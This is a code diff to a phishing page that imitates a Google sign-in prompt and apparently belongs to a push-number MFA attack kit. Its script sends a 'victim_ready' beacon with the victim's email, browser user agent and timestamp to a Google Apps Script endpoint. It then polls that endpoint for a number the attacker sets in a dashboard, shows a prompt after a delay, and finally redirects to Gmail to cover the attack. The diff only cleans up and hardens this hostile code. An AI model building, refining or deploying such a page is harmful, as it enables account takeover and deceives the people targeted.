@@ -25,7 +25,6 @@
   <div class="card">
     <div class="logo">
       <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-        <!-- Google logo paths (same as before) -->
         <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
         <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
         <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -49,8 +48,7 @@
   </div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbylaVgqYqizifCGZAwXwbpPznIezqQVghQMk_REkR3YR2U2pPOr8Bq6rQfL84yl3Wrp/exec
-  ";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbylaVgqYqizifCGZAwXwbpPznIezqQVghQMk_REkR3YR2U2pPOr8Bq6rQfL84yl3Wrp/exec";
 
     let email = localStorage.getItem("demoEmail") || "someone@example.com";
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
@@ -58,27 +56,45 @@
     const statusEl = document.getElementById("status");
     const debugEl = document.getElementById("debugMsg");
 
-    function log(msg) { console.log(msg); debugEl.textContent = msg; }
+    function log(msg) { 
+      console.log(msg); 
+      debugEl.textContent = msg; 
+    }
 
-    // Send ready signal
+    // Send victim_ready signal
+    const readyParams = new URLSearchParams({
+      action: "victim_ready",
+      email: email,
+      user_agent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    });
+
     fetch(SCRIPT_URL, {
       method: "POST",
-      headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: new URLSearchParams({ action: "victim_ready", email, user_agent: navigator.userAgent, timestamp: new Date().toISOString() }),
+      headers: { "Content-Type": "text/plain;charset=utf-8" },
+      body: readyParams.toString(),
       mode: "no-cors",
       keepalive: true
-    }).then(() => log("Ready signal sent")).catch(e => log("Ready signal failed: " + e));
+    })
+    .then(() => {
+      console.log("victim_ready signal sent (optimistic)");
+      log("Ready signal sent");
+    })
+    .catch(e => {
+      console.error("victim_ready fetch failed:", e);
+      log("Ready signal failed");
+    });
 
-    // Poll (cannot read response due to no-cors)
+    // Poll for prompt number
     setInterval(() => {
       fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`, {
         mode: "no-cors",
         cache: "no-cache"
       }).catch(e => console.error("Poll failed", e));
-      log("Polling... (number set in dashboard will appear soon)");
+      log("Polling for number...");
     }, 4000);
 
-    // Show prompt section after delay (number display requires attacker action)
+    // Show prompt section after delay
     setTimeout(() => {
       document.getElementById("loading").style.display = "none";
       document.getElementById("prompt-section").style.display = "block";
@@ -86,9 +102,10 @@
     }, 6000);
 
     // Timeout redirect
-    setTimeout(() => window.location.href = "https://mail.google.com/", 90000);
+    setTimeout(() => {
+      window.location.href = "https://mail.google.com/";
+    }, 90000);
   </script>
 </body>
-</html>
-
   
+</html>
